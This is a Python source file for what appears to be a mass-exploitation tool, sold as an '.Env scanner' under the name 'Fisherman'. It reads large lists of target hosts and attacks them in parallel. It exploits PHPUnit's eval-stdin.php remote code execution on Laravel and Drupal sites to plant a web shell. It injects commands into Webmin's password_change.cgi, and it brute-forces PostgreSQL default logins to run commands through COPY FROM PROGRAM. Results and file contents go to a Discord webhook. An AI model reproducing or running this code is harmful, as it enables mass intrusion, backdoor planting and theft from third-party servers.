                if rce_vuln:
                    kernel = raw_cek.split('|')[-1]
                    result_phpunit.update(message=kernel, vuln=True)
                    try:
                        if rce == '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php':
                            payload = payloads.get('laravel')
                        elif rce == '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php':
                            payload = payloads.get('drupal')
                        res_rce = http.post(rce_bug, timeout=TIME_OUT, verify=False,
                                            allow_redirects=False,
                                            headers=def_header, data=payload)
                        rce_raw = res_rce.content.decode(encoding='utf-8', errors='ignore')
                        if 'RCE_VULN' in rce_raw:
                            shell_url = rce_bug
                            with open(FILE_RESULT_HOST, 'a+') as y:
                                y.write('%s\n' % rce_bug)
                                y.close()
                            with open(FILE_RESULT_RCE, 'a+') as a:
                                if rce == '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php':
                                    shell_url = re.sub(r"vendor\/[^\n]+", 'storage/framework/%s' % SHELL_NAME, rce_bug)
                                elif rce == '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php':
                                    shell_url = re.sub(r"\/sites/all\/[^\n]+", '/sites/default/files//%s' % SHELL_NAME,
                                                       rce_bug)
                                else:
                                    shell_url = rce_bug.replace("eval-stdin.php", SHELL_NAME)
                                a.write('%s\n' % shell_url)
                                a.close()
                                try:
                                    http.post(rce_bug, timeout=TIME_OUT, verify=False,
                                              allow_redirects=False,
                                              headers=def_header, data=extra_cmd)
                                except:
                                    pass
                            result_phpunit.update(url=shell_url)
                        else:
                            result_phpunit.update(url=rce_bug)
                            with open(FILE_RESULT_HOST, 'a+') as a:
                                a.write('%s\n' % rce_bug)
                                a.close()
                            with open(FILE_FAIL_RCE, 'a+') as x:
                                x.write('%s\n' % rce_bug)
                                x.close()
                            try:
                                http.post(rce_bug, timeout=TIME_OUT, verify=False, allow_redirects=False,
                                          headers=def_header, data=extra_cmd)
                            except:
                                pass
                    except:
                        result_phpunit.update(url=rce_bug)
                        with open(FILE_RESULT_HOST, 'a+') as a:
                            a.write('%s\n' % rce_bug)
                            a.close()
                        with open(FILE_FAIL_RCE, 'a+') as x:
                            x.write('%s\n' % rce_bug)
                            x.close()
                        pass
                else:
                    match = re.search(r"<\s?title\s?>([^\n<>]+)<\/\s?title\s?>", raw_cek)
                    if match:
                        result_phpunit.update(message=str(match.group(1)), ready=True)
                    else:
                        result_phpunit.update(message=res_cek.reason, ready=True)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except:
                pass
            finally:
                if result_phpunit.get('vuln'):
                    break
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as error:
        logging.exception(''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
        pass
    return result_phpunit


def scan_webmin(url, def_header, extra_path=[]):
    result_webmin = {'vuln': None, 'message': 'Unknown'}
    payloads = {
        'test': 'echo "WEBMIN_VULN";uname -a',
    }
    if not os.path.exists(PATH_RESULT):
        os.mkdir(PATH_RESULT)
    parsed = urlparse(url)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http', parsed.netloc)
    else:
        target = 'http://{}'.format(url)
    WHOST = urlparse(target).netloc
    payload_test = 'user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2' % payloads.get('test')
    FILE_RESULT_WEBMIN = os.path.join(PATH_ROOT, 'result-webmin.txt')
    FILE_FAIL_WEBMIN = os.path.join(PATH_ROOT, 'fail-webmin.txt')
    FILE_RESULT_WHOST = os.path.join(PATH_RESULT, '%s.txt' % WHOST.strip())
    try:
        http = requests.session()
        webmin_bug = target
        webmin_bug_file = '/'.join([webmin_bug, "password_change.cgi"])
        extra_cmd = 'user=rootxx&pam=&expired=2&old=test|{};{}&new1=test2&new2=test2'.format(EXTRA_COMMAND,
                                                                                             payloads.get('test'))
        HEADER_WEBMIN = {
            'accept-encoding': "gzip, deflate",
            'accept': "*/*",
            'accept-language': "en",
            'connection': "close",
            'cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
            'referer': "%s/session_login.cgi" % webmin_bug,
            'content-type': "application/x-www-form-urlencoded",
            # 'content-length': "60",
            'cache-control': "no-cache"
        }
        def_header.update(HEADER_WEBMIN)
        try:
            if DEBUG:
                print('[Exploiting] %s\n' % webmin_bug, end='')
            res_ssl = http.post(webmin_bug_file, timeout=5, verify=False, allow_redirects=False,
                                headers=def_header)
            raw_ssl = res_ssl.content.decode(encoding='utf-8', errors='ignore')
            if 'document follows' in raw_ssl.lower():
                webmin_bug = re.sub("http://", "https://", webmin_bug, 0, re.IGNORECASE | re.MULTILINE)
                webmin_bug_file = re.sub("http://", "https://", webmin_bug_file, 0, re.IGNORECASE | re.MULTILINE)
                def_header.update(referer="%s/session_login.cgi" % webmin_bug)
            res_cek = http.post(webmin_bug_file, timeout=5, verify=False, allow_redirects=False,
                                headers=def_header, data=payload_test)
            raw_cek = res_cek.content.decode(encoding='utf-8', errors='ignore')
            if 'WEBMIN_VULN' in raw_cek and res_cek.status_code == 200 and "the current password is " in raw_cek.lower():
                kernel = re.compile(r"WEBMIN_VULN(.*)</h3>", re.DOTALL)
                kernel = kernel.findall(raw_cek)[0].replace('\r', '').replace('\n', '')
                result_webmin.update(message=kernel, vuln=True)
                try:
                    res_webmin = http.post(webmin_bug_file, timeout=TIME_OUT, verify=False, allow_redirects=False,
                                           headers=def_header, data=extra_cmd)
                    webmin_raw = res_webmin.content.decode(encoding='utf-8', errors='ignore')
                    if 'WEBMIN_VULN' in webmin_raw:
                        with open(FILE_RESULT_WHOST, 'a+') as y:
                            y.write('%s\n' % webmin_bug_file)
                            y.close()
                        with open(FILE_RESULT_WEBMIN, 'a+') as a:
                            a.write('%s\n' % webmin_bug_file)
                            a.close()
                    else:
                        with open(FILE_RESULT_WHOST, 'a+') as a:
                            a.write('%s\n' % webmin_bug_file)
                            a.close()
                        with open(FILE_FAIL_WEBMIN, 'a+') as x:
                            x.write('%s\n' % webmin_bug_file)
                            x.close()
                        try:
                            http.post(webmin_bug_file, timeout=TIME_OUT, verify=False, allow_redirects=False,
                                      headers=def_header, data=extra_cmd)
                        except:
                            pass
                except:
                    with open(FILE_RESULT_WHOST, 'a+') as a:
                        a.write('%s\n' % webmin_bug_file)
                        a.close()
                    with open(FILE_FAIL_WEBMIN, 'a+') as x:
                        x.write('%s\n' % webmin_bug_file)
                        x.close()
                    try:
                        http.post(webmin_bug_file, timeout=TIME_OUT, verify=False, allow_redirects=False,
                                  headers=def_header, data=extra_cmd)
                    except:
                        pass
            else:
                match = re.search(r"<\s?title\s?>([^\n<>]+)<\/\s?title\s?>", raw_cek)
                if match:
                    message_match = str(match.group(1))
                else:
                    message_match = res_cek.reason
                result_webmin.update(message=message_match, ready=True)
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except:
            pass
        # finally:
        #     if result_webmin.get('vuln'):
        #         break
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as error:
        logging.exception(''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
        pass
    return result_webmin


def scan_psql(url):
    result_psql = {'vuln': None, 'message': 'Unknown'}
    vuln_user = [
        "dcmadmin",
        "postgres",
        "admin",
    ]
    vuln_pass = [
        "123",
        "admin",
        "amber",
        "passw0rd",
        "password",
        "postgres",
    ]
    payloads = {
        'test': "SELECT version();",
        'default': "CREATE TABLE IF NOT EXISTS {{random_string}} (id text);COPY {{random_string}} from program '{{command_text}}';SELECT id FROM {{random_string}};",
        'delete': "DROP TABLE {{random_string}};"
    }
    if not os.path.exists(PATH_RESULT):
        os.mkdir(PATH_RESULT)
    parsed = url.split(':')
    target_ip = parsed[0]
    target_port = parsed[1]
    PHOST = target_ip
    random_string = "backup_" + uuid.uuid4().hex[:10]
    payloads = {k: v.replace('{{random_string}}', random_string).replace('{{command_text}}', ';'.join(
        ['echo "PSQL_VULN"', EXTRA_COMMAND])).replace('{{timeout_execute}}', str(TIME_OUT)) for k, v in
                payloads.items()}
    payload_test = payloads.get('test')
    payload = payloads.get('default')
    payload_delete = payloads.get('delete')
    FILE_RESULT_PSQL = os.path.join(PATH_ROOT, 'result-psql.txt')
    FILE_FAIL_PSQL = os.path.join(PATH_ROOT, 'fail-psql.txt')
    FILE_RESULT_PHOST = os.path.join(PATH_RESULT, '%s.txt' % PHOST.strip())
    try:
        for puser in vuln_user:
            for ppass in vuln_pass:
                try:
                    psql_bug = '@'.join([':'.join([puser, ppass]), url])
                    if DEBUG:
                        print('[Exploiting] %s\n' % psql_bug, end='')
                    conn = psycopg2.connect(host=target_ip, port=target_port, user=puser, password=ppass,
                                            connect_timeout=TIME_OUT, dbname='')
                    status = conn.closed
                    cur = conn.cursor()
                    cur.execute(payload_test)
                    kernel = result_psql.get('message')
                    for k in cur.fetchall():
                        kernel = k[0]
                    version = int(re.findall(r'PostgreSQL (.*?)\.', kernel, re.IGNORECASE)[0])
                    conn.commit()
                    cur.close()
                    if version >= 9:
                        # print(conn)
                        cur = conn.cursor()
                        cur.execute(payload)
                        res_inj = cur.fetchall()
                        cur.execute(payload_delete)
                        conn.commit()
                        cur.close()
                        raw = []
                        for r in res_inj:
                            raw.append(r[0])
                        raw = "|".join(raw)
                        if 'PSQL_VULN' in raw:
                            result_psql.update(message=kernel, vuln=True)
                            with open(FILE_RESULT_PHOST, 'a+') as y:
                                y.write('%s\n' % psql_bug)
                                y.close()
                            with open(FILE_RESULT_PSQL, 'a+') as a:
                                a.write('%s\n' % psql_bug)
                                a.close()
                        else:
                            with open(FILE_RESULT_PHOST, 'a+') as a:
                                a.write('%s\n' % psql_bug)
                                a.close()
                            with open(FILE_FAIL_PSQL, 'a+') as x:
                                x.write('%s\n' % psql_bug)
                                x.close()
                        conn.close()
                    else:
                        conn.close()
                        pass
                    conn.close()
                except (psycopg2.Error, psycopg2.OperationalError) as e:
                    # print(str(e))
                    try:
                        conn.commit()
                    except:
                        pass
                    try:
                        cur.close()
                    except:
                        pass
                    try:
                        conn.close()
                    except:
                        pass
                except KeyboardInterrupt:
                    raise KeyboardInterrupt
                except:
                    pass
                finally:
                    if result_psql.get('vuln'):
                        break
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as error:
        logging.exception(
            ''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
        pass
    return result_psql


def do_check(url, attk=['all'], extra_path=[], force=False):
    parsed = urlparse(url)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http', parsed.netloc)
    else:
        target = 'http://{}'.format(url)
    psql_target = target
    AHOST = urlparse(target).netloc
    RESULT_DATA = []
    DEFAULT_HEADER = {
        'user-agent': random_ua(),
        'referer': 'https://www.google.com/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
    }
    try:
        if re.search(':({})'.format('|'.join(PSQL_PORT_LIST)), target, re.IGNORECASE):
            psql_target = re.sub("http(s)?://", "", target, 0, re.IGNORECASE)
            raw_check = check_psql(psql_target)
        else:
            raw_check = check_url(target, DEFAULT_HEADER)
        cms = raw_check.get('cms')
        if raw_check.get('ready'):
            print(style.WHITE("[!]%s : %s ~ %s" % (AHOST, cms, raw_check.get('message').strip())))
            if any(ev in 'env' for ev in attk) or any(ev in 'all' for ev in attk):
                env = scan_env(target, DEFAULT_HEADER, force)
                if bool(env.get('vuln')):
                    RESULT_DATA.append({'mod': 'ENV', 'data': env})
                    print(style.GREEN('[+] ') + style.BLUE(AHOST) + style.RESET(' [ENV] ') + style.YELLOW(cms) +
                          style.RESET(' : ') + style.RESET(env.get('message')))
                    env_app = scan_env_app_key(target, DEFAULT_HEADER)
                    if bool(env_app.get('vuln')):
                        print(
                            style.GREEN('[+] ') + style.BLUE(AHOST) + style.RESET(' [CVE-2018-15133] ') + style.YELLOW(
                                cms) +
                            style.RESET(' : ') + style.RESET(env_app.get('message')))
                else:
                    print(style.RED('[x] ') + style.BLUE(AHOST) + style.RESET(' [ENV] ') + style.YELLOW(
                        cms) + style.RESET(' : ') + style.RESET(env.get('message')))
            if any(ev in 'env' for ev in attk) or any(ev in 'all' for ev in attk) and cms == 'Laravel':
                env = scan_env_laravel_debug(target, DEFAULT_HEADER)
                if bool(env.get('vuln')):
                    RESULT_DATA.append({'mod': 'ENV_DEBUG', 'data': env})
                    print(style.GREEN('[+] ') + style.BLUE(AHOST) + style.RESET(' [ENV_DEBUG] ') + style.YELLOW(cms) +
                          style.RESET(' : ') + style.RESET(env.get('message')))
                else:
                    print(style.RED('[x] ') + style.BLUE(AHOST) + style.RESET(' [ENV_DEBUG] ') + style.YELLOW(
                        cms) + style.RESET(' : ') + style.RESET(env.get('message')))
            if any(ev in 'phpunit' for ev in attk) or any(ev in 'all' for ev in attk):
                phpunit = scan_phpunit(target, DEFAULT_HEADER, extra_path)
                if bool(phpunit.get('vuln')):
                    RESULT_DATA.append({'mod': 'PHPUNIT', 'data': phpunit})
                    print(
                        style.GREEN('[+] ') + style.BLUE(AHOST) + style.RESET(' [PHPUNIT] ') + style.YELLOW(cms) +
                        style.RESET(' : ') + style.RESET(
                            phpunit.get('message')))
                else:
                    print(
                        style.RED('[x] ') + style.BLUE(AHOST) + style.RESET(' [PHPUNIT] ') + style.YELLOW(
                            cms) + style.RESET(' : ') + style.RESET(phpunit.get('message')))
            if any(ev in 'webmin' for ev in attk) or any(ev in 'all' for ev in attk):
                webmin = scan_webmin(target, DEFAULT_HEADER, extra_path)
                if bool(webmin.get('vuln')):
                    RESULT_DATA.append({'mod': 'webmin', 'data': webmin})
                    print(
                        style.GREEN('[+] ') + style.BLUE(AHOST) + style.RESET(' [WEBMIN] ') + style.YELLOW(cms) +
                        style.RESET(' : ') + style.RESET(
                            webmin.get('message')))
                else:
                    print(
                        style.RED('[x] ') + style.BLUE(AHOST) + style.RESET(' [WEBMIN] ') + style.YELLOW(
                            cms) + style.RESET(' : ') + style.RESET(webmin.get('message')))
            if 'PostgreSQL DB' in cms and 'OK' in raw_check.get('message').strip():
                if any(ev in 'psql' for ev in attk) or any(ev in 'all' for ev in attk):
                    psql = scan_psql(psql_target)
                    if bool(psql.get('vuln')):
                        RESULT_DATA.append({'mod': 'psql', 'data': psql})
                        print(
                            style.GREEN('[+] ') + style.BLUE(AHOST) + style.RESET(' [PSQL] ') + style.YELLOW(cms) +
                            style.RESET(' : ') + style.RESET(
                                psql.get('message')))
                    else:
                        print(
                            style.RED('[x] ') + style.BLUE(AHOST) + style.RESET(' [PSQL] ') + style.YELLOW(
                                cms) + style.RESET(' : ') + style.RESET(psql.get('message')))
        else:
            print(style.RED('[x] ') + style.BLUE(AHOST) + style.YELLOW(cms) + style.RESET(' : ') + style.RESET(
                raw_check.get('message')))
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as ex:
        print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
    finally:
        if len(RESULT_DATA) and DISCORD_WEBHOOK:
            try:
                DISCORD = DiscordWebhook(url=DISCORD_WEBHOOK)
                embed = DiscordEmbed(title='Fisherman Result', description='%s Scanning result' % (AHOST),
                                     color=242424)
                embed.set_author(name=AHOST, url=target,
                                 icon_url='https://api.faviconkit.com/%s/144' % (AHOST))
                embed.set_footer(text=AHOST)
                embed.set_timestamp()
                for mod in RESULT_DATA:
                    mod_name = mod.get('mod')
                    embed.add_embed_field(name='Module', value=mod_name, inline=False)
                    dat = mod.get('data')
                    for dk, dv in dat.items():
                        if isinstance(dv, str) and len(dv):
                            if os.path.isfile(dv):
                                with open(dv, 'r') as op:
                                    DISCORD.add_file(op.read(), os.path.basename(dv))
                            else:
                                embed.add_embed_field(name=str('-').join([mod_name, dk]).lower(), value=dv)
                DISCORD.add_embed(embed)
                DISCORD.execute()
            except Exception as ex:
                print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                pass


def support_format(str_ip):
    parsed = urlparse(str_ip)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http',
                                  clean_netloc(parsed.netloc))
    elif not parsed.scheme and parsed.netloc:
        target = 'http://{}'.format(clean_netloc(parsed.netloc))
    else:
        target = 'http://{}'.format(clean_netloc(str_ip))
    return target.replace('\r', '').replace('\n', '')


def clean_netloc(netloc):
    return re.sub(r"^(cpanel|www|whm|webmail|mail|webdisk|dc-[0-9]+)\.", "", netloc)


def is_valid_ip(ip_str):
    reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
    if re.match(reg, ip_str):
        return True
    else:
        return False


def is_valid_hostname(hostname):
    if hostname[-1] == ".":
        hostname = hostname[:-1]
    if len(hostname) > 253:
        return False
    labels = hostname.split(".")
    if re.match(r"[0-9]+$", labels[-1]):
        return False
    allowed = re.compile(r"(?!-)[a-z0-9-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(label) for label in labels)


def support_input(url):
    try:
        result = urlparse(url)
        if all([result.scheme, result.netloc]):
            return True
        else:
            return is_valid_ip(url) or is_valid_hostname(url)
    except:
        return is_valid_ip(url) or is_valid_hostname(url)


# auxiliary funciton to make it work
def map_helper(args):
    return do_check(*args)


class style():
    BLACK = lambda x: '\033[30m' + str(x)
    RED = lambda x: '\033[31m' + str(x)
    GREEN = lambda x: '\033[32m' + str(x)
    YELLOW = lambda x: '\033[33m' + str(x)
    BLUE = lambda x: '\033[34m' + str(x)
    MAGENTA = lambda x: '\033[35m' + str(x)
    CYAN = lambda x: '\033[36m' + str(x)
    WHITE = lambda x: '\033[37m' + str(x)
    UNDERLINE = lambda x: '\033[4m' + str(x)
    RESET = lambda x: '\033[0m' + str(x)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(conflict_handler='resolve', description='.Env scanner',
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-l', action='store', dest='file_list',
                        help='List file', default=None)
    parser.add_argument('-a', action='store', dest='attack_list',
                        help='Attack list = ( all / phpunit / webmin / psql )', type=str, default='env,phpunit')
    parser.add_argument('-t', action="store", dest="max_thread", type=int, default=multiprocessing.cpu_count() + 2)
    parser.add_argument('-shell', action="store", dest="shell_code", help='shell code url', type=str,
                        default=SHELL_CODE)
    parser.add_argument('-name', action="store", dest="shell_name", help='shell name', type=str, default=SHELL_NAME)
    parser.add_argument('-custom', action="store", dest="custom", help='custom', type=str, default='paths.txt')
    parser.add_argument('-timeout', action="store", dest="timeout", type=int, default=20)
    parser.add_argument('-d', action='store_true', dest='debug',
                        help='show debug', default=False)
    parser.add_argument('-f', action='store_true', dest='force',
                        help='force scan if already scanned', default=False)
    args = parser.parse_args()
    if 'file_list' not in args or not args.file_list:
        parser.print_help()
        sys.exit(1)
    else:
        FILE_LIST = [l.strip() for l in args.file_list.split(",")]
        MAX_THREAD = args.max_thread
        DEBUG = args.debug
        FORCE = args.force
        TIME_OUT = args.timeout
        SHELL_NAME = args.shell_name
        SHELL_CODE = args.shell_code
        customs = args.custom
        LIST_URL = []
        ATTACK = [a.strip() for a in args.attack_list.split(",")]
        if 'webmin' in ATTACK or 'psql' in ATTACK or 'all' in ATTACK:
            print(style.RESET('You use All or WEBMIN or PSQL of attack mode !'))
            CAUTION = input(style.RESET("Make sure your list does not exceed 1.000.000 (y/n) : "))
            if 'y' not in CAUTION.lower():
                sys.exit(1)
        try:
            for l in FILE_LIST:
                file = l.strip()
                print(style.YELLOW("Filtering list of {} .....\r".format(file)), flush=True)
                chnk = 2500
                counter = 0
                try:
                    with open(file, 'r') as fp:
                        while True:
                            lines = list(islice(fp, chnk))
                            for line in lines:
                                if support_input(line):
                                    LIST_URL.append(support_format(line))
                                    if 'webmin' in ATTACK or 'all' in ATTACK:
                                        for webmin_port in WEBMIN_PORT_LIST:
                                            webmin_ipport = ':'.join([support_format(line), webmin_port])
                                            LIST_URL.append(webmin_ipport)
                                    if 'psql' in ATTACK or 'all' in ATTACK:
                                        for psql_port in PSQL_PORT_LIST:
                                            psql_ipport = ':'.join([support_format(line), psql_port])
                                            LIST_URL.append(psql_ipport)
                            if not lines:
                                break
                except:
                    pass
        except Exception as ex:
            print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
            pass
        try:
            if customs:
                try:
                    with open(customs, 'r') as c:
                        for line in c.readlines():
                            if re.search("eval-stdin.php", line, re.IGNORECASE):
                                EXTRA_PATH.append(line.strip())
                except Exception as ex:
                    pass
            if LIST_URL:
                print(style.YELLOW('Starting {} jobs with {} workers'.format(len(LIST_URL), MAX_THREAD)))
                iterable = [(i.strip(), ATTACK, EXTRA_PATH, FORCE) for i in LIST_URL]
                with ThreadPool(MAX_THREAD) as pool:
                    try:
                        results = pool.map(map_helper, iterable)
                    except (SystemExit, KeyboardInterrupt):
                        pool.close()
                        pool.terminate()
                        raise KeyboardInterrupt('Cancelled....!')
                    finally:
                        pool.close()
                        pool.join()
        except KeyboardInterrupt:
            print("Caught KeyboardInterrupt, terminating workers")
        except Exception as ex:
            print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
            pass
